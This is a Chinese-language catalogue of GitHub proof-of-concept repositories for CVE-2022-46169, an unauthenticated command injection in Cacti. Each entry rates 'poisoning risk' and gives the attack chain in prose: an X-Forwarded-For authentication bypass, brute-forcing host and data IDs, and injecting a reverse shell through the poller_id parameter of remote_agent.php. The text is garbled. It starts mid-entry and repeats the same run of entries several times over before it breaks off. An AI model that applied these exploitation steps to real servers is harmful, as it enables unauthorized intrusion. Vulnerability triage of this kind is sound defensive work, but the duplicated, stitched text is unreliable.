**利用条件:** 目标系统运行受影响的Cacti版本，存在具有`POLLER_ACTION_SCRIPT_PHP`操作的`poller_item`，且攻击者能够访问`remote_agent.php`。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 中的一个命令注入漏洞，未经身份验证的攻击者可以通过精心构造的请求执行任意OS命令。该漏洞存在于`remote_agent.php`文件中，通过伪造 `X-Forwarded-For` 头绕过身份验证，然后通过 `polldata` 操作注入命令。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞已被积极利用。提供的PoC代码利用了身份验证绕过和命令注入漏洞，通过爆破 `host_id` 和 `local_data_ids` 来查找具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`，如果找到则执行反弹 shell 命令。  PoC的有效性较高。

**投毒风险：**
查看提供的PoC代码（`CVE-2022-46169.py`和`LICENSE`），主要功能是利用漏洞，没有发现明显的恶意代码或后门。`LICENSE` 文件是 GNU GPL v3 许可协议，属于开源协议。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 头部来伪造客户端IP地址，绕过 `remote_agent.php` 文件的身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以调用 `polldata` 操作，并通过 `poller_id` 参数注入恶意命令。  PoC利用bash反弹shell。
3.  **参数爆破：** PoC代码通过爆破 `host_id` 和 `local_data_ids` 来查找具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`。
4.  **执行任意命令：** 成功注入命令后，服务器将执行攻击者提供的命令。

**项目地址:** [0xZon/CVE-2022-46169-Exploit](https://github.com/0xZon/CVE-2022-46169-Exploit)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #3

**来源**: [CVE-2022-46169-BKreisel_CVE-2022-46169.md](../2022/CVE-2022-46169-BKreisel_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** <= 1.2.22

**利用条件:** 需要Cacti服务器可访问，且存在action类型为POLLER_ACTION_SCRIPT_PHP（2）的poller_item配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 存在于 Cacti 1.2.22 及更早版本中，是一个未经身份验证的远程命令注入漏洞。攻击者可以通过伪造HTTP头绕过身份验证，然后通过操纵`poller_id`参数在`remote_agent.php`文件中执行任意命令。PoC代码通过Python脚本实现，利用此漏洞获取反向shell。该仓库的主要功能是提供漏洞利用代码，但由于开源软件的性质，任何人都可能修改并重新发布。**投毒风险较低 (5%)**，主要是因为该项目结构简单、代码量小，且功能单一，主要代码集中在cve_2022_46169/main.py中。需要人工审核确认没有恶意代码被隐藏。尽管存在风险，但考虑到代码的直接性和漏洞利用的明确性，以及利用反向shell的常见性，可以判断该代码的投毒可能性较低。

**利用方式：**
1.  攻击者首先需要确定目标Cacti服务器的版本低于或等于1.2.22。
2.  攻击者发送特制的HTTP请求到`remote_agent.php`，包含伪造的`Forwarded-For`头，绕过身份验证。
3.  攻击者构造包含恶意命令的`poller_id`参数，并将其发送到`remote_agent.php`，触发命令注入。
4.  如果目标服务器存在`POLLER_ACTION_SCRIPT_PHP`类型的`poller_item`配置，攻击者的命令将被执行。
5.  PoC代码利用此漏洞创建一个反向shell，允许攻击者远程控制目标服务器。

**项目地址:** [BKreisel/CVE-2022-46169](https://github.com/BKreisel/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #4

**来源**: [CVE-2022-46169-FredBrave_CVE-2022-46169-CACTI-1.2.22.md](../2022/CVE-2022-46169-FredBrave_CVE-2022-46169-CACTI-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti版本低于1.2.23且存在action类型为POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item 配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 `remote_agent.php` 文件中的请求参数来执行任意操作系统命令。漏洞利用涉及以下步骤：

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP Header 欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器自身的 IP 地址，从而绕过身份验证检查。
2.  **`polldata` 操作触发：**  身份验证绕过后，攻击者可以调用 `remote_agent.php` 中的 `polldata` 操作。
3.  **命令注入：** 通过构造恶意的 `poller_id` 参数，将命令注入到传递给 `proc_open` 函数的字符串中，从而执行任意命令。
4.  **利用条件：** 成功利用需要存在一个 `poller_item`，其 `action` 字段值为 `POLLER_ACTION_SCRIPT_PHP`（值为2）。`host_id` 和 `local_data_ids` 可以通过暴力破解找到。

提供的POC代码 (`CVE-2022-46169.py`) 实现了上述攻击过程，包含以下步骤：

*   检查目标是否易受攻击 (`checkVuln` 函数)。
*   通过暴力破解查找有效的 `host_id` 和 `local_data_ids` (`bruteForcing` 函数)。
*   构造包含反向shell payload 的恶意请求，并将其发送到 `remote_agent.php` (`Reverse_shell` 函数)。

**关于投毒风险：**

对提供的POC代码进行分析，并未发现明显的恶意投毒代码，例如删除文件、上传恶意文件等行为。POC代码的主要功能是利用漏洞进行反向Shell连接。但依然存在一定的潜在风险：

*   **依赖风险：** 虽然代码本身看起来没有恶意，但它依赖于 `requests` 和 `urllib` 库。如果这些库本身被篡改，可能会引入风险。
*   **命令执行风险：**  该漏洞本身允许执行任意命令，攻击者可以利用这一点执行恶意操作。但这不属于代码投毒，而是漏洞的 inherent risk。

因此，将投毒风险评估为 5%。

**项目地址:** [FredBrave/CVE-2022-46169-CACTI-1.2.22](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #5

**来源**: [CVE-2022-46169-HPT-Intern-Task-Submission_CVE-2022-46169.md](../2022/CVE-2022-46169-HPT-Intern-Task-Submission_CVE-2022-46169.md)

## CVE-2022-46169 - Cacti 未授权远程代码执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标Cacti实例必须存在action类型为POLLER_ACTION_SCRIPT_PHP (2)的 poller_item配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中存在的一个未经身份验证的远程代码执行漏洞。该漏洞利用链包括身份验证绕过和命令注入两部分。

**利用方式：**

1.  **身份验证绕过：**  攻击者通过构造包含`Forwarded-For: <TARGETIP>`头的HTTP请求，其中`<TARGETIP>`为Cacti服务器的IP地址。`get_client_addr()` 函数会读取 `Forwarded-For` 头部，导致服务器错误地将攻击者识别为自身。因为Cacti默认会在poller表中添加自身hostname, 因此导致认证绕过。
2.  **命令注入：**  绕过身份验证后，攻击者可以调用`remote_agent.php`的`polldata`动作。该动作调用 `poll_for_data` 函数，该函数从请求参数中获取 `$poller_id`，此参数未经过滤直接拼接到 `proc_open` 函数的参数中，导致命令注入。攻击者需要提供一个`host_id`和`local_data_id`，并且对应poller_item的action必须是`POLLER_ACTION_SCRIPT_PHP`(值为2)才能触发命令注入.

**有效性：**

提供的POC代码（docker-compose.yaml）用于搭建存在漏洞的Cacti环境，方便漏洞分析和复现。漏洞原理描述清晰，利用方式明确。综合漏洞描述和搜索引擎结果，该漏洞利用的有效性高。

**投毒风险：**

虽然POC的主要目的是演示和分析漏洞，但存在一定的投毒风险。docker-compose.yaml 文件中使用了镜像 `smcline06/cacti`，如果该镜像被篡改，可能包含恶意代码。此外，提供的教程包含大量图片链接，这些链接如果指向恶意网站，也可能存在风险。综合考虑，评估投毒风险为10%。

**项目地址:** [HPT-Intern-Task-Submission/CVE-2022-46169](https://github.com/HPT-Intern-Task-Submission/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #6

**来源**: [CVE-2022-46169-Habib0x0_CVE-2022-46169.md](../2022/CVE-2022-46169-Habib0x0_CVE-2022-46169.md)

## CVE-2022-46169 - Cacti 未授权命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在满足条件的 poller_item (POLLER_ACTION_SCRIPT_PHP 类型), 且攻击者能够访问 remote_agent.php 页面。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。漏洞位于 `remote_agent.php` 文件中，攻击者可以通过构造特定的 HTTP 请求，绕过身份验证，并利用 `poller_id` 参数进行命令注入。 

**利用方式：**

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP Header，伪造客户端IP，绕过 `remote_agent.php` 的身份验证。
2.  **参数污染:** 攻击者利用`poller_id`，`host_id`，`local_data_ids[]`参数进行参数污染。
3.  **命令注入：** 成功绕过身份验证后，攻击者可以利用 `polldata` action，将恶意命令注入到 `poller_id` 参数中，从而执行任意系统命令。

**POC 分析：**

提供的 Ruby POC 代码首先尝试绕过身份验证，然后爆破`host_id`和`local_data_ids[]`，以找到有效的 `poller_item`，最后构造包含恶意命令的 URL，并发送 HTTP 请求触发命令注入。

**投毒风险分析：**

该 POC 代码主要功能是利用漏洞进行攻击。投毒风险较低，但仍然存在一定的潜在风险。
*   **依赖项风险：** POC 代码依赖于 `net/http`、`uri`、`json`、`optparse`、`artii` 和 `colorize` 等 Ruby 库。虽然这些库本身不太可能包含恶意代码，但始终存在依赖项被污染的风险。
*   **恶意命令注入：** 虽然 POC 中显示的命令是发起反向 Shell，但攻击者可以修改 POC 代码，注入其他恶意命令，例如删除文件、篡改数据等。因此，在使用 POC 时，务必仔细审查代码，确保不会执行未授权的操作。

综上，该 POC 的投毒风险相对较低，但仍需谨慎使用，并对代码进行充分审查。

**项目地址:** [Habib0x0/CVE-2022-46169](https://github.com/Habib0x0/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #7

**来源**: [CVE-2022-46169-JacobEbben_CVE-2022-46169_unauth_remote_code_execution.md](../2022/CVE-2022-46169-JacobEbben_CVE-2022-46169_unauth_remote_code_execution.md)

# CVE-2022-46169

> 📦 该CVE有 **31** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-46169-0xN7y_CVE-2022-46169.md](../2022/CVE-2022-46169-0xN7y_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例的URL，以及目标Cacti实例存在至少一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操控HTTP请求头`X-Forwarded-For`绕过身份验证，然后利用`polldata`动作触发命令注入。漏洞存在于`remote_agent.php`文件中，攻击者通过伪造客户端IP绕过认证，进而利用`poller_id`参数执行任意命令。提供的Python POC代码通过尝试不同的`host_id`和`poller_id`值，发送包含反向shell命令的恶意请求。 

**有效性：**
根据漏洞描述和POC代码，该漏洞利用是有效的，因为它可以允许未经身份验证的攻击者在受影响的Cacti实例上执行任意命令。

**投毒风险：**
该POC代码的投毒风险较低，约为5%。代码主要实现了漏洞利用，没有发现明显的恶意行为，如删除文件、上传恶意文件等。但是，任何漏洞利用代码都可能被修改为包含恶意功能，因此在使用前仍需谨慎审查。以下为可能的投毒点:

*   **反向shell地址：** 攻击者可能在不知情的情况下使用了被污染的反向shell监听地址，导致攻击暴露。
*   **命令注入payload：** 虽然当前payload是反向shell，但攻击者可能在不知情的情况下运行了其他有害命令。

**利用方式：**
1.  **身份验证绕过：** 通过设置`X-Forwarded-For` HTTP头为Cacti服务器的IP地址，绕过`remote_agent.php`的身份验证。
2.  **触发命令注入：** 访问`remote_agent.php`，并设置`action`参数为`polldata`，`poller_id`参数为恶意命令。需要结合有效的`host_id`和`local_data_ids[]`，使得对应的`poller_item`的`action`为`POLLER_ACTION_SCRIPT_PHP`。
3.  **命令执行：** Cacti执行`proc_open`函数，将构造的恶意命令注入到shell中，实现远程代码执行。

**项目地址:** [0xN7y/CVE-2022-46169](https://github.com/0xN7y/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #2

**来源**: [CVE-2022-46169-0xZon_CVE-2022-46169-Exploit.md](../2022/CVE-2022-46169-0xZon_CVE-2022-46169-Exploit.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，存在具有`POLLER_ACTION_SCRIPT_PHP`操作的`poller_item`，且攻击者能够访问`remote_agent.php`。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 中的一个命令注入漏洞，未经身份验证的攻击者可以通过精心构造的请求执行任意OS命令。该漏洞存在于`remote_agent.php`文件中，通过伪造 `X-Forwarded-For` 头绕过身份验证，然后通过 `polldata` 操作注入命令。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞已被积极利用。提供的PoC代码利用了身份验证绕过和命令注入漏洞，通过爆破 `host_id` 和 `local_data_ids` 来查找具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`，如果找到则执行反弹 shell 命令。  PoC的有效性较高。

**投毒风险：**
查看提供的PoC代码（`CVE-2022-46169.py`和`LICENSE`），主要功能是利用漏洞，没有发现明显的恶意代码或后门。`LICENSE` 文件是 GNU GPL v3 许可协议，属于开源协议。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 头部来伪造客户端IP地址，绕过 `remote_agent.php` 文件的身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以调用 `polldata` 操作，并通过 `poller_id` 参数注入恶意命令。  PoC利用bash反弹shell。
3.  **参数爆破：** PoC代码通过爆破 `host_id` 和 `local_data_ids` 来查找具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`。
4.  **执行任意命令：** 成功注入命令后，服务器将执行攻击者提供的命令。

**项目地址:** [0xZon/CVE-2022-46169-Exploit](https://github.com/0xZon/CVE-2022-46169-Exploit)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #3

**来源**: [CVE-2022-46169-BKreisel_CVE-2022-46169.md](../2022/CVE-2022-46169-BKreisel_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** <= 1.2.22

**利用条件:** 需要Cacti服务器可访问，且存在action类型为POLLER_ACTION_SCRIPT_PHP（2）的poller_item配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 存在于 Cacti 1.2.22 及更早版本中，是一个未经身份验证的远程命令注入漏洞。攻击者可以通过伪造HTTP头绕过身份验证，然后通过操纵`poller_id`参数在`remote_agent.php`文件中执行任意命令。PoC代码通过Python脚本实现，利用此漏洞获取反向shell。该仓库的主要功能是提供漏洞利用代码，但由于开源软件的性质，任何人都可能修改并重新发布。**投毒风险较低 (5%)**，主要是因为该项目结构简单、代码量小，且功能单一，主要代码集中在cve_2022_46169/main.py中。需要人工审核确认没有恶意代码被隐藏。尽管存在风险，但考虑到代码的直接性和漏洞利用的明确性，以及利用反向shell的常见性，可以判断该代码的投毒可能性较低。

**利用方式：**
1.  攻击者首先需要确定目标Cacti服务器的版本低于或等于1.2.22。
2.  攻击者发送特制的HTTP请求到`remote_agent.php`，包含伪造的`Forwarded-For`头，绕过身份验证。
3.  攻击者构造包含恶意命令的`poller_id`参数，并将其发送到`remote_agent.php`，触发命令注入。
4.  如果目标服务器存在`POLLER_ACTION_SCRIPT_PHP`类型的`poller_item`配置，攻击者的命令将被执行。
5.  PoC代码利用此漏洞创建一个反向shell，允许攻击者远程控制目标服务器。

**项目地址:** [BKreisel/CVE-2022-46169](https://github.com/BKreisel/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #4

**来源**: [CVE-2022-46169-FredBrave_CVE-2022-46169-CACTI-1.2.22.md](../2022/CVE-2022-46169-FredBrave_CVE-2022-46169-CACTI-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti版本低于1.2.23且存在action类型为POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item 配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 `remote_agent.php` 文件中的请求参数来执行任意操作系统命令。漏洞利用涉及以下步骤：

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP Header 欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器自身的 IP 地址，从而绕过身份验证检查。
2.  **`polldata` 操作触发：**  身份验证绕过后，攻击者可以调用 `remote_agent.php` 中的 `polldata` 操作。
3.  **命令注入：** 通过构造恶意的 `poller_id` 参数，将命令注入到传递给 `proc_open` 函数的字符串中，从而执行任意命令。
4.  **利用条件：** 成功利用需要存在一个 `poller_item`，其 `action` 字段值为 `POLLER_ACTION_SCRIPT_PHP`（值为2）。`host_id` 和 `local_data_ids` 可以通过暴力破解找到。

提供的POC代码 (`CVE-2022-46169.py`) 实现了上述攻击过程，包含以下步骤：

*   检查目标是否易受攻击 (`checkVuln` 函数)。
*   通过暴力破解查找有效的 `host_id` 和 `local_data_ids` (`bruteForcing` 函数)。
*   构造包含反向shell payload 的恶意请求，并将其发送到 `remote_agent.php` (`Reverse_shell` 函数)。

**关于投毒风险：**

对提供的POC代码进行分析，并未发现明显的恶意投毒代码，例如删除文件、上传恶意文件等行为。POC代码的主要功能是利用漏洞进行反向Shell连接。但依然存在一定的潜在风险：

*   **依赖风险：** 虽然代码本身看起来没有恶意，但它依赖于 `requests` 和 `urllib` 库。如果这些库本身被篡改，可能会引入风险。
*   **命令执行风险：**  该漏洞本身允许执行任意命令，攻击者可以利用这一点执行恶意操作。但这不属于代码投毒，而是漏洞的 inherent risk。

因此，将投毒风险评估为 5%。

**项目地址:** [FredBrave/CVE-2022-46169-CACTI-1.2.22](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #5

**来源**: [CVE-2022-46169-HPT-Intern-Task-Submission_CVE-2022-46169.md](../2022/CVE-2022-46169-HPT-Intern-Task-Submission_CVE-2022-46169.md)

## CVE-2022-46169 - Cacti 未授权远程代码执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标Cacti实例必须存在action类型为POLLER_ACTION_SCRIPT_PHP (2)的 poller_item配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中存在的一个未经身份验证的远程代码执行漏洞。该漏洞利用链包括身份验证绕过和命令注入两部分。

**利用方式：**

1.  **身份验证绕过：**  攻击者通过构造包含`Forwarded-For: <TARGETIP>`头的HTTP请求，其中`<TARGETIP>`为Cacti服务器的IP地址。`get_client_addr()` 函数会读取 `Forwarded-For` 头部，导致服务器错误地将攻击者识别为自身。因为Cacti默认会在poller表中添加自身hostname, 因此导致认证绕过。
2.  **命令注入：**  绕过身份验证后，攻击者可以调用`remote_agent.php`的`polldata`动作。该动作调用 `poll_for_data` 函数，该函数从请求参数中获取 `$poller_id`，此参数未经过滤直接拼接到 `proc_open` 函数的参数中，导致命令注入。攻击者需要提供一个`host_id`和`local_data_id`，并且对应poller_item的action必须是`POLLER_ACTION_SCRIPT_PHP`(值为2)才能触发命令注入.

**有效性：**

提供的POC代码（docker-compose.yaml）用于搭建存在漏洞的Cacti环境，方便漏洞分析和复现。漏洞原理描述清晰，利用方式明确。综合漏洞描述和搜索引擎结果，该漏洞利用的有效性高。

**投毒风险：**

虽然POC的主要目的是演示和分析漏洞，但存在一定的投毒风险。docker-compose.yaml 文件中使用了镜像 `smcline06/cacti`，如果该镜像被篡改，可能包含恶意代码。此外，提供的教程包含大量图片链接，这些链接如果指向恶意网站，也可能存在风险。综合考虑，评估投毒风险为10%。

**项目地址:** [HPT-Intern-Task-Submission/CVE-2022-46169](https://github.com/HPT-Intern-Task-Submission/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #6

**来源**: [CVE-2022-46169-Habib0x0_CVE-2022-46169.md](../2022/CVE-2022-46169-Habib0x0_CVE-2022-46169.md)

## CVE-2022-46169 - Cacti 未授权命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在满足条件的 poller_item (POLLER_ACTION_SCRIPT_PHP 类型), 且攻击者能够访问 remote_agent.php 页面。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。漏洞位于 `remote_agent.php` 文件中，攻击者可以通过构造特定的 HTTP 请求，绕过身份验证，并利用 `poller_id` 参数进行命令注入。 

**利用方式：**

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP Header，伪造客户端IP，绕过 `remote_agent.php` 的身份验证。
2.  **参数污染:** 攻击者利用`poller_id`，`host_id`，`local_data_ids[]`参数进行参数污染。
3.  **命令注入：** 成功绕过身份验证后，攻击者可以利用 `polldata` action，将恶意命令注入到 `poller_id` 参数中，从而执行任意系统命令。

**POC 分析：**

提供的 Ruby POC 代码首先尝试绕过身份验证，然后爆破`host_id`和`local_data_ids[]`，以找到有效的 `poller_item`，最后构造包含恶意命令的 URL，并发送 HTTP 请求触发命令注入。

**投毒风险分析：**

该 POC 代码主要功能是利用漏洞进行攻击。投毒风险较低，但仍然存在一定的潜在风险。
*   **依赖项风险：** POC 代码依赖于 `net/http`、`uri`、`json`、`optparse`、`artii` 和 `colorize` 等 Ruby 库。虽然这些库本身不太可能包含恶意代码，但始终存在依赖项被污染的风险。
*   **恶意命令注入：** 虽然 POC 中显示的命令是发起反向 Shell，但攻击者可以修改 POC 代码，注入其他恶意命令，例如删除文件、篡改数据等。因此，在使用 POC 时，务必仔细审查代码，确保不会执行未授权的操作。

综上，该 POC 的投毒风险相对较低，但仍需谨慎使用，并对代码进行充分审查。

**项目地址:** [Habib0x0/CVE-2022-46169](https://github.com/Habib0x0/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #7

**来源**: [CVE-2022-46169-JacobEbben_CVE-2022-46169_unauth_remote_code_execution.md](../2022/CVE-2022-46169-JacobEbben_CVE-2022-46169_unauth_remote_code_execution.md)

# CVE-2022-46169

> 📦 该CVE有 **31** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-46169-0xN7y_CVE-2022-46169.md](../2022/CVE-2022-46169-0xN7y_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例的URL，以及目标Cacti实例存在至少一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操控HTTP请求头`X-Forwarded-For`绕过身份验证，然后利用`polldata`动作触发命令注入。漏洞存在于`remote_agent.php`文件中，攻击者通过伪造客户端IP绕过认证，进而利用`poller_id`参数执行任意命令。提供的Python POC代码通过尝试不同的`host_id`和`poller_id`值，发送包含反向shell命令的恶意请求。 

**有效性：**
根据漏洞描述和POC代码，该漏洞利用是有效的，因为它可以允许未经身份验证的攻击者在受影响的Cacti实例上执行任意命令。

**投毒风险：**
该POC代码的投毒风险较低，约为5%。代码主要实现了漏洞利用，没有发现明显的恶意行为，如删除文件、上传恶意文件等。但是，任何漏洞利用代码都可能被修改为包含恶意功能，因此在使用前仍需谨慎审查。以下为可能的投毒点:

*   **反向shell地址：** 攻击者可能在不知情的情况下使用了被污染的反向shell监听地址，导致攻击暴露。
*   **命令注入payload：** 虽然当前payload是反向shell，但攻击者可能在不知情的情况下运行了其他有害命令。

**利用方式：**
1.  **身份验证绕过：** 通过设置`X-Forwarded-For` HTTP头为Cacti服务器的IP地址，绕过`remote_agent.php`的身份验证。
2.  **触发命令注入：** 访问`remote_agent.php`，并设置`action`参数为`polldata`，`poller_id`参数为恶意命令。需要结合有效的`host_id`和`local_data_ids[]`，使得对应的`poller_item`的`action`为`POLLER_ACTION_SCRIPT_PHP`。
3.  **命令执行：** Cacti执行`proc_open`函数，将构造的恶意命令注入到shell中，实现远程代码执行。

**项目地址:** [0xN7y/CVE-2022-46169](https://github.com/0xN7y/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #2

**来源**: [CVE-2022-46169-0xZon_CVE-2022-46169-Exploit.md](../2022/CVE-2022-46169-0xZon_CVE-2022-46169-Exploit.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，存在具有`POLLER_ACTION_SCRIPT_PHP`操作的`poller_item`，且攻击者能够访问`remote_agent.php`。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 中的一个命令注入漏洞，未经身份验证的攻击者可以通过精心构造的请求执行任意OS命令。该漏洞存在于`remote_agent.php`文件中，通过伪造 `X-Forwarded-For` 头绕过身份验证，然后通过 `polldata` 操作注入命令。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞已被积极利用。提供的PoC代码利用了身份验证绕过和命令注入漏洞，通过爆破 `host_id` 和 `local_data_ids` 来查找具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`，如果找到则执行反弹 shell 命令。  PoC的有效性较高。

**投毒风险：**
查看提供的PoC代码（`CVE-2022-46169.py`和`LICENSE`），主要功能是利用漏洞，没有发现明显的恶意代码或后门。`LICENSE` 文件是 GNU GPL v3 许可协议，属于开源协议。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 头部来伪造客户端IP地址，绕过 `remote_agent.php` 文件的身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以调用 `polldata` 操作，并通过 `poller_id` 参数注入恶意命令。  PoC利用bash反弹shell。
3.  **参数爆破：** PoC代码通过爆破 `host_id` 和 `local_data_ids` 来查找具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`。
4.  **执行任意命令：** 成功注入命令后，服务器将执行攻击者提供的命令。

**项目地址:** [0xZon/CVE-2022-46169-Exploit](https://github.com/0xZon/CVE-2022-46169-Exploit)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #3

**来源**: [CVE-2022-46169-BKreisel_CVE-2022-46169.md](../2022/CVE-2022-46169-BKreisel_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** <= 1.2.22

**利用条件:** 需要Cacti服务器可访问，且存在action类型为POLLER_ACTION_SCRIPT_PHP（2）的poller_item配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

